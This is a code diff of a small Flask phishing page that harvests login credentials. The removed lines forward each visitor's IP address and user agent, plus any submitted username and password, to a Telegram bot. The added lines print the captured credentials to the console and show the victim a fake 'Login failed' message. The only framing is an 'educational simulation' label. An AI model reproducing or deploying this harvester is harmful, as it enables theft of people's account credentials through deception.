@@ -1,26 +1,16 @@
-from flask import Flask, request, render_template
-import requests
-import os
+from flask import Flask, render_template, request
 
-app = Flask(__name__, template_folder="templates")
+app = Flask(__name__)
 
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-CHAT_ID = os.getenv("CHAT_ID")
+@app.route("/", methods=["GET", "POST"])
+def login():
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
+        print(f"[🛡️] Captured Credentials -> Username: {username}, Password: {password}")
+        return "Login failed. Try again later."
 
-def send_telegram(message):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    requests.get(url, params={'chat_id': CHAT_ID, 'text': message})
-
-@app.route('/')
-def index():
-    ip = request.remote_addr
-    ua = request.headers.get('User-Agent')
-    send_telegram(f"👀 Visitor Detected\n🌐 IP: {ip}\n📱 UA: {ua}")
     return render_template("login.html")
 
-@app.route('/login', methods=['POST'])
-def login():
-    username = request.form.get('username')
-    password = request.form.get('password')
-    send_telegram(f"🔐 Login Attempt:\n👤 Username: {username}\n🔑 Password: {password}")
-    return "✅ Educational simulation complete. Data not stored."
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=10000)
